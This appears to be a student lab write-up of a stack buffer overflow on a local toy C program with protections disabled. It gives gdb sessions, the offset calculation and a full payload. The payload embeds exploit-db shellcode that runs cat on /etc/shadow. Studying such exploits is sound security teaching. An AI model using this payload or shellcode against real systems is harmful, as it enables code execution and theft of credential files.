# Part One

After compiling the program and disabling some security parameters: 
```shell
$ gcc -m64 pt1.c -o pt1 -z execstack -fno-stack-protector
$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space  
```
We can examine the program assembly language with gdp:
```shell
$ gdb ./pt1                                              
```
Once in gdp menu we can use disas main to examine assembly and add breakpoints.
We start by setting three breakpoints; one by main at beginning, one by mov instruction aftr strcpy, and one by leave:
```shell
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000001165 <+0>:     push   %rbp
   0x0000000000001166 <+1>:     mov    %rsp,%rbp
   0x0000000000001169 <+4>:     sub    $0x110,%rsp
   0x0000000000001170 <+11>:    mov    %edi,-0x104(%rbp)
   0x0000000000001176 <+17>:    mov    %rsi,-0x110(%rbp)
   0x000000000000117d <+24>:    cmpl   $0x2,-0x104(%rbp)
   0x0000000000001184 <+31>:    je     0x1190 <main+43>
   0x0000000000001186 <+33>:    mov    $0x0,%edi
   0x000000000000118b <+38>:    call   0x1060 <exit@plt>
   0x0000000000001190 <+43>:    lea    -0x100(%rbp),%rax
   0x0000000000001197 <+50>:    mov    %rax,%rsi
   0x000000000000119a <+53>:    lea    0xe63(%rip),%rdi        # 0x2004
   0x00000000000011a1 <+60>:    mov    $0x0,%eax
   0x00000000000011a6 <+65>:    call   0x1050 <printf@plt>
   0x00000000000011ab <+70>:    mov    -0x110(%rbp),%rax
   0x00000000000011b2 <+77>:    add    $0x8,%rax
   0x00000000000011b6 <+81>:    mov    (%rax),%rdx
   0x00000000000011b9 <+84>:    lea    -0x100(%rbp),%rax
   0x00000000000011c0 <+91>:    mov    %rdx,%rsi
   0x00000000000011c3 <+94>:    mov    %rax,%rdi
   0x00000000000011c6 <+97>:    call   0x1030 <strcpy@plt>
   0x00000000000011cb <+102>:   lea    -0x100(%rbp),%rax
   0x00000000000011d2 <+109>:   mov    %rax,%rdi
   0x00000000000011d5 <+112>:   call   0x1040 <puts@plt>
   0x00000000000011da <+117>:   mov    $0x0,%eax
   0x00000000000011df <+122>:   leave  
   0x00000000000011e0 <+123>:   ret    
End of assembler dump.
(gdb) break main
Breakpoint 1 at 0x1169
(gdb) break *main+109
Breakpoint 2 at 0x11d2
(gdb) break *main+123
Breakpoint 3 at 0x11e0
```
After setting breakpoints we can run a simple command to print numerous As which will allows us
to observe when the overflow occurs. Here we can see memory locations after strcpy:
```shell
(gdb) r $(python -c "print 'A'*300")
Starting program: /home/arun/Desktop/pt1 $(python -c "print 'A'*300")

Breakpoint 1, 0x0000555555555169 in main ()
(gdb) c
Continuing.
0x7fffffffddd0

Breakpoint 2, 0x00005555555551d2 in main ()
(gdb) x/20xg $rsp
0x7fffffffddc0: 0x00007fffffffdfc8      0x0000000200000000
0x7fffffffddd0: 0x4141414141414141      0x4141414141414141
0x7fffffffdde0: 0x4141414141414141      0x4141414141414141
0x7fffffffddf0: 0x4141414141414141      0x4141414141414141
0x7fffffffde00: 0x4141414141414141      0x4141414141414141
0x7fffffffde10: 0x4141414141414141      0x4141414141414141
0x7fffffffde20: 0x4141414141414141      0x4141414141414141
0x7fffffffde30: 0x4141414141414141      0x4141414141414141
0x7fffffffde40: 0x4141414141414141      0x4141414141414141
0x7fffffffde50: 0x4141414141414141      0x4141414141414141
(gdb) 
```
Here we see that the memory address for overflow starts at 0x7fffffffddd0, If we continue to the
next breakpoint we can see locations after leave and before return:
```shell
Breakpoint 3, 0x00005555555551e0 in main ()
(gdb) x/20xg $rsp
0x7fffffffded8: 0x4141414141414141      0x4141414141414141
0x7fffffffdee8: 0x4141414141414141      0x4141414141414141
0x7fffffffdef8: 0x00007f0041414141      0x0000000000000000
0x7fffffffdf08: 0x6f88c21562541164      0x0000555555555080
0x7fffffffdf18: 0x0000000000000000      0x0000000000000000
0x7fffffffdf28: 0x0000000000000000      0x3add97407c741164
0x7fffffffdf38: 0x3add877d78321164      0x0000000000000000
0x7fffffffdf48: 0x0000000000000000      0x0000000000000000
0x7fffffffdf58: 0x0000000000000002      0x00007fffffffdfc8
0x7fffffffdf68: 0x00007fffffffdfe0      0x00007ffff7ffe180
(gdb) 
```
Here we see address 0x7fffffffded8. If we use steoi we can contiue to run return where we get sigsegv error,
the register show as follows:
```shell
(gdb) stepi

Program received signal SIGSEGV, Segmentation fault.
0x00005555555551e0 in main ()
(gdb) i r
rax            0x0                 0
rbx            0x0                 0
rcx            0x7ffff7eddf33      140737352949555
rdx            0x0                 0
rsi            0x5555555592a0      93824992252576
rdi            0x7ffff7fb0670      140737353811568
rbp            0x4141414141414141  0x4141414141414141
rsp            0x7fffffffded8      0x7fffffffded8
r8             0x12d               301
r9             0xf                 15
r10            0x7ffff7fef3c0      140737354068928
r11            0x246               582
r12            0x555555555080      93824992235648
r13            0x0                 0
r14            0x0                 0
r15            0x0                 0
rip            0x5555555551e0      0x5555555551e0 <main+123>
eflags         0x10246             [ PF ZF IF RF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
(gdb) 
```
We can see the previous address listed is stored at RSP after return. If we subtract the memory locations stated before we can get
the value 7fffffffded8 - 7fffffffddd0 = 264 in decimal. This allows us to set our payload into something like:
```shell
(gdb) r $(python -c "print 'A'*264 + 'B'*6")
```
If we stop at the breakpoint before leave and observe the memory locations we see this: 
```shell
Breakpoint 3, 0x00005555555551e0 in main ()
(gdb) x/20xg $rsp
0x7fffffffdef8: 0x0000424242424242      0x00007fffffffdfe8
0x7fffffffdf08: 0x0000000200000000      0x0000555555555165
0x7fffffffdf18: 0x00007ffff7e157cf      0x0000000000000000
0x7fffffffdf28: 0x0bc54d296a808388      0x0000555555555080
0x7fffffffdf38: 0x0000000000000000      0x0000000000000000
0x7fffffffdf48: 0x0000000000000000      0x5e90187c77608388
0x7fffffffdf58: 0x5e90084170e68388      0x0000000000000000
0x7fffffffdf68: 0x0000000000000000      0x0000000000000000
0x7fffffffdf78: 0x0000000000000002      0x00007fffffffdfe8
0x7fffffffdf88: 0x00007fffffffe000      0x00007ffff7ffe180
(gdb) 
```
The memory address 0x7fffffffdef8 is important. If we observe the registers we see this address is in the rsp register:
```shell
(gdb) i r
rax            0x0                 0
rbx            0x0                 0
rcx            0x7ffff7eddf33      140737352949555
rdx            0x0                 0
rsi            0x5555555592a0      93824992252576
rdi            0x7ffff7fb0670      140737353811568
rbp            0x4141414141414141  0x4141414141414141
rsp            0x7fffffffdef8      0x7fffffffdef8
r8             0x10f               271
r9             0xf                 15
r10            0x7ffff7fef3c0      140737354068928
r11            0x246               582
r12            0x555555555080      93824992235648
r13            0x0                 0
r14            0x0                 0
r15            0x0                 0
rip            0x5555555551e0      0x5555555551e0 <main+123>
eflags         0x246               [ PF ZF IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
(gdb) 
```
If we continue the program to to sigsegv error we can see the rip register contains the 424242 from the previous memory location:
```shell
(gdb) i r
rax            0x0                 0
rbx            0x0                 0
rcx            0x7ffff7eddf33      140737352949555
rdx            0x0                 0
rsi            0x5555555592a0      93824992252576
rdi            0x7ffff7fb0670      140737353811568
rbp            0x4141414141414141  0x4141414141414141
rsp            0x7fffffffdf00      0x7fffffffdf00
r8             0x10f               271
r9             0xf                 15
r10            0x7ffff7fef3c0      140737354068928
r11            0x246               582
r12            0x555555555080      93824992235648
r13            0x0                 0
r14            0x0                 0
r15            0x0                 0
rip            0x424242424242      0x424242424242
eflags         0x10246             [ PF ZF IF RF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
(gdb) 
```
Now that we know how to control RIP we can begin constructing a malicious payload. This will look something like this:
```shell
(gdb) r $(python -c 'print "\x48\x31\xc0\x48\x31\xed\x50\x48\xbd\x63\x2f\x73\x68\x61\x64\x6f\x77\x55\x48\xbd\x2f\x2f\x2f\x2f\x2f\x2f\x65\x74\x55\x48\x89\xe5\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x63\x61\x74\x53\x48\x89\xe3\x48\x89\xe7\x50\x48\x89\xe2\x55\x53\x48\x89\xe6\x66\x6a\x3b\x66\x58\x0f\x05" + "A" * 198 + "\x7f\xff\xff\xff\xdd\xd0"[::-1]')
```
Where the beginning part is a shell code taken from https://www.exploit-db.com/shellcodes/49547, Middle part, As, are used to fill up remaining space,
and last part is starting memory address. The offset is 264 and the shell code used is 66 bytes long. So subtracting 66 from 264 we get 198 as the new value multiplied by A. If we run it we can see nothing out of ordinary happens but printf function shows something weird:
```shell
(gdb) r $(python -c 'print "\x48\x31\xc0\x48\x31\xed\x50\x48\xbd\x63\x2f\x73\x68\x61\x64\x6f\x77\x55\x48\xbd\x2f\x2f\x2f\x2f\x2f\x2f\x65\x74\x55\x48\x89\xe5\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x63\x61\x74\x53\x48\x89\xe3\x48\x89\xe7\x50\x48\x89\xe2\x55\x53\x48\x89\xe6\x66\x6a\x3b\x66\x58\x0f\x05" + "A" * 198 + "\x7f\xff\xff\xff\xdd\xd0"[::-1]')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/arun/Desktop/pt1 $(python -c 'print "\x48\x31\xc0\x48\x31\xed\x50\x48\xbd\x63\x2f\x73\x68\x61\x64\x6f\x77\x55\x48\xbd\x2f\x2f\x2f\x2f\x2f\x2f\x65\x74\x55\x48\x89\xe5\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x63\x61\x74\x53\x48\x89\xe3\x48\x89\xe7\x50\x48\x89\xe2\x55\x53\x48\x89\xe6\x66\x6a\x3b\x66\x58\x0f\x05" + "A" * 198 + "\x7f\xff\xff\xff\xdd\xd0"[::-1]')

Breakpoint 1, 0x0000555555555169 in main ()
(gdb) c
Continuing.
0x7fffffffddf0

Breakpoint 2, 0x00005555555551d2 in main ()
(gdb) c
Continuing.
�?_�w
     AH1�H1�f���H�4$H��H1�f��H1�H1�@��H��H1�H1�<�����/etc/passwdAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����

Breakpoint 3, 0x00005555555551e0 in main ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007fffffffddd0 in ?? ()
```

We see a memory address printed in the middle from code in our c file and this is the new starting memory location 0x7fffffffddf0 so we replace our old 0x7fffffffddd0. Now if we adjust our payload and run we can see a process is run outside the code that should not be run:
```shell
(gdb) r $(python -c 'print "\x48\x31\xc0\x48\x31\xed\x50\x48\xbd\x63\x2f\x73\x68\x61\x64\x6f\x77\x55\x48\xbd\x2f\x2f\x2f\x2f\x2f\x2f\x65\x74\x55\x48\x89\xe5\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x63\x61\x74\x53\x48\x89\xe3\x48\x89\xe7\x50\x48\x89\xe2\x55\x53\x48\x89\xe6\x66\x6a\x3b\x66\x58\x0f\x05" + "A" * 198 + "\x7f\xff\xff\xff\xdd\xf0"[::-1]')
Starting program: /home/arun/Desktop/pt1 $(python -c 'print "\x48\x31\xc0\x48\x31\xed\x50\x48\xbd\x63\x2f\x73\x68\x61\x64\x6f\x77\x55\x48\xbd\x2f\x2f\x2f\x2f\x2f\x2f\x65\x74\x55\x48\x89\xe5\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x63\x61\x74\x53\x48\x89\xe3\x48\x89\xe7\x50\x48\x89\xe2\x55\x53\x48\x89\xe6\x66\x6a\x3b\x66\x58\x0f\x05" + "A" * 198 + "\x7f\xff\xff\xff\xdd\xf0"[::-1]')

Breakpoint 1, 0x0000555555555169 in main ()
(gdb) c
Continuing.
0x7fffffffddf0

Breakpoint 2, 0x00005555555551d2 in main ()
(gdb) c
Continuing.
H1�H1�PH�c/shadowUH�//////etUH��PH�/bin/catSH��H��PH��USH��fj;fXAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����

Breakpoint 3, 0x00005555555551e0 in main ()
(gdb) c
Continuing.
process 2444 is executing new program: /usr/bin/cat
Error in re-setting breakpoint 1: Function "main" not defined.
Error in re-setting breakpoint 2: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 3: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 2: No symbol "main" in current context.
Error in re-setting breakpoint 3: No symbol "main" in current context.
Error in re-setting breakpoint 2: No symbol "main" in current context.
Error in re-setting breakpoint 3: No symbol "main" in current context.
Error in re-setting breakpoint 2: No symbol "main" in current context.
Error in re-setting breakpoint 3: No symbol "main" in current context.
/bin/cat: //////etc/shadow: Permission denied
[Inferior 1 (process 2444) exited with code 01]
```
Here we can see a process was executed via malicious shell code inputted.

shell code used:
\x48\x31\xc0\x48\x31\xed\x50\x48\xbd\x63\x2f\x73\x68\x61\x64\x6f\x77\x55\x48\xbd\x2f\x2f\x2f\x2f\x2f\x2f\x65\x74\x55\x48\x89\xe5\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x63\x61\x74\x53\x48\x89\xe3\x48\x89\xe7\x50\x48\x89\xe2\x55\x53\x48\x89\xe6\x66\x6a\x3b\x66\x58\x0f\x05
source: https://www.exploit-db.com/shellcodes/49547




